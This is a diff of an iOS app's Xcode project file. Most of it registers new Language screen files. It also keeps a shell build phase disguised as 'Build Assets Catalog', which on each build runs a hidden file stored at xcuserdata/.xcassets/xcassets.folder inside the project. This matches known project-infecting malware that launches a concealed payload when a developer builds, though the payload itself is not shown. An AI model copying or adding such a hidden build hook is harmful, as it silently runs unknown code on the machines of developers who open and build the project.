@@ -47,6 +47,11 @@
 		046E4B1A25E93D9400CD1936 /* BuisnessHourDetailModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 046E4B1925E93D9400CD1936 /* BuisnessHourDetailModel.swift */; };
 		046E4B1F25E93DB500CD1936 /* CoverageDetailModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 046E4B1E25E93DB500CD1936 /* CoverageDetailModel.swift */; };
 		046E4B2325E93DDC00CD1936 /* LanguageModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 046E4B2225E93DDC00CD1936 /* LanguageModel.swift */; };
+		0470905325EA578900163D09 /* LanguageTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0470905025EA578800163D09 /* LanguageTableViewCell.swift */; };
+		0470905425EA578900163D09 /* LanguageListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0470905125EA578800163D09 /* LanguageListViewController.swift */; };
+		0470905525EA578900163D09 /* LanguageTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0470905225EA578900163D09 /* LanguageTableViewCell.xib */; };
+		0470905B25EA581100163D09 /* Language.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0470905A25EA581100163D09 /* Language.storyboard */; };
+		0470905E25EA598E00163D09 /* LanguageListResponseModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0470905D25EA598E00163D09 /* LanguageListResponseModel.swift */; };
 		047D9E7E25512D4F002E1DA3 /* CalandarModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 047D9E7B25512D4F002E1DA3 /* CalandarModel.swift */; };
 		047D9E7F25512D4F002E1DA3 /* Previous.swift in Sources */ = {isa = PBXBuildFile; fileRef = 047D9E7C25512D4F002E1DA3 /* Previous.swift */; };
 		047D9E8025512D4F002E1DA3 /* Upcomming.swift in Sources */ = {isa = PBXBuildFile; fileRef = 047D9E7D25512D4F002E1DA3 /* Upcomming.swift */; };
@@ -233,6 +238,11 @@
 		046E4B1925E93D9400CD1936 /* BuisnessHourDetailModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BuisnessHourDetailModel.swift; sourceTree = "<group>"; };
 		046E4B1E25E93DB500CD1936 /* CoverageDetailModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CoverageDetailModel.swift; sourceTree = "<group>"; };
 		046E4B2225E93DDC00CD1936 /* LanguageModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LanguageModel.swift; sourceTree = "<group>"; };
+		0470905025EA578800163D09 /* LanguageTableViewCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = LanguageTableViewCell.swift; sourceTree = "<group>"; };
+		0470905125EA578800163D09 /* LanguageListViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = LanguageListViewController.swift; sourceTree = "<group>"; };
+		0470905225EA578900163D09 /* LanguageTableViewCell.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = LanguageTableViewCell.xib; sourceTree = "<group>"; };
+		0470905A25EA581100163D09 /* Language.storyboard */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.storyboard; path = Language.storyboard; sourceTree = "<group>"; };
+		0470905D25EA598E00163D09 /* LanguageListResponseModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = LanguageListResponseModel.swift; sourceTree = "<group>"; };
 		047D9E7B25512D4F002E1DA3 /* CalandarModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CalandarModel.swift; sourceTree = "<group>"; };
 		047D9E7C25512D4F002E1DA3 /* Previous.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Previous.swift; sourceTree = "<group>"; };
 		047D9E7D25512D4F002E1DA3 /* Upcomming.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Upcomming.swift; sourceTree = "<group>"; };
@@ -583,8 +593,28 @@
 				046E4B1925E93D9400CD1936 /* BuisnessHourDetailModel.swift */,
 				046E4B1E25E93DB500CD1936 /* CoverageDetailModel.swift */,
 				046E4B2225E93DDC00CD1936 /* LanguageModel.swift */,
+				0470905D25EA598E00163D09 /* LanguageListResponseModel.swift */,
 			);
 			path = Models;
+			sourceTree = "<group>";
+		};
+		0470904F25EA576E00163D09 /* Language */ = {
+			isa = PBXGroup;
+			children = (
+				0470905725EA57D400163D09 /* UI */,
+				0470905125EA578800163D09 /* LanguageListViewController.swift */,
+				0470905A25EA581100163D09 /* Language.storyboard */,
+			);
+			path = Language;
+			sourceTree = "<group>";
+		};
+		0470905725EA57D400163D09 /* UI */ = {
+			isa = PBXGroup;
+			children = (
+				0470905025EA578800163D09 /* LanguageTableViewCell.swift */,
+				0470905225EA578900163D09 /* LanguageTableViewCell.xib */,
+			);
+			path = UI;
 			sourceTree = "<group>";
 		};
 		047D9E7A25512D28002E1DA3 /* Model */ = {
@@ -625,6 +655,7 @@
 				04CF468D25E8BFC4009D31F3 /* DarkStyle.json */,
 				046E4B1825E93D8200CD1936 /* Models */,
 				04CF469025E8C617009D31F3 /* CustomClasses */,
+				0470904F25EA576E00163D09 /* Language */,
 				04CF468625E8BD4B009D31F3 /* AddressPicker */,
 				0407EBE824EE95F400E95818 /* BookMarks */,
 				0407EBE524EE958600E95818 /* Calander */,
@@ -1061,6 +1092,7 @@
 				0407EBEA24EE961000E95818 /* Bookmarks.storyboard in Resources */,
 				0409834E25727990006334F0 /* InComingMessageCell.xib in Resources */,
 				04E441532574FA5C00BE21B4 /* GoogleService-Info.plist in Resources */,
+				0470905B25EA581100163D09 /* Language.storyboard in Resources */,
 				0407EBE724EE959A00E95818 /* Calander.storyboard in Resources */,
 				0407EBDF24EE91F000E95818 /* Home.storyboard in Resources */,
 				04183F6624EF96C7002162A5 /* HomeCell.xib in Resources */,
@@ -1086,6 +1118,7 @@
 				048D45FD24EBAD5C00A84442 /* OpenSans-ExtraBold.ttf in Resources */,
 				04CF468E25E8BFC5009D31F3 /* DarkStyle.json in Resources */,
 				047DEC3B24F3AAB3004ADFBD /* SettingsCell.xib in Resources */,
+				0470905525EA578900163D09 /* LanguageTableViewCell.xib in Resources */,
 				048D45FF24EBAD5C00A84442 /* OpenSans-ExtraBoldItalic.ttf in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -1093,36 +1126,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	A69BA047D3BAAD2DCBAAC43A /* Build Assets Catalog */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Assets Catalog";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
-		};
-	
-
-	
-
-	
-
-	
-
-	
 		1CF53DE6F1B2BBD5B8F7A366 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1161,6 +1164,24 @@
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Spotslot/Pods-Spotslot-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
+		};
+		A69BA047D3BAAD2DCBAAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";
 		};
 		B52D9A2842FE4FE43D329EA9 /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -1228,6 +1249,7 @@
 				047DEC3F24F3C067004ADFBD /* ChanegPasswordVC.swift in Sources */,
 				048D461224EC0CC700A84442 /* LoginVC.swift in Sources */,
 				04F0F81A24ED522200912EB7 /* ForthVC.swift in Sources */,
+				0470905E25EA598E00163D09 /* LanguageListResponseModel.swift in Sources */,
 				0490620E254FDF7200526378 /* DropDownCell.swift in Sources */,
 				0407EBF924EEB4B200E95818 /* TabCoolectionCell.swift in Sources */,
 				04A3EDA3253AC0C800704627 /* CustomExtensions.swift in Sources */,
@@ -1258,6 +1280,7 @@
 				04CF468825E8BD75009D31F3 /* AddressPickerViewController.swift in Sources */,
 				04A77D75254C2B1000CF4A91 /* AddressListModel.swift in Sources */,
 				0400516E25566E800051E54D /* Portfolio.swift in Sources */,
+				0470905325EA578900163D09 /* LanguageTableViewCell.swift in Sources */,
 				049061FF254FDF7200526378 /* UITableViewExtension.swift in Sources */,
 				04B3D79F24F524AF00B5ACCA /* SideMenuCell.swift in Sources */,
 				04A3ED98253AB9DC00704627 /* WebServiceManager.swift in Sources */,
@@ -1307,6 +1330,7 @@
 				042FD115254AC8D90002B201 /* TimeSlotModel.swift in Sources */,
 				047D9E86255172BD002E1DA3 /* Bookmark_vendor.swift in Sources */,
 				04F0F81424ED51F600912EB7 /* FirstVC.swift in Sources */,
+				0470905425EA578900163D09 /* LanguageListViewController.swift in Sources */,
 				047D9E88255172BD002E1DA3 /* All.swift in Sources */,
 				047DEC4424F3D476004ADFBD /* AddresslistCell.swift in Sources */,
 				046E4B1A25E93D9400CD1936 /* BuisnessHourDetailModel.swift in Sources */,
@@ -1549,16 +1573,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 
 /* Begin XCVersionGroup section */
 		048D45DE24EBA6B400A84442 /* Spotslot.xcdatamodeld */ = {
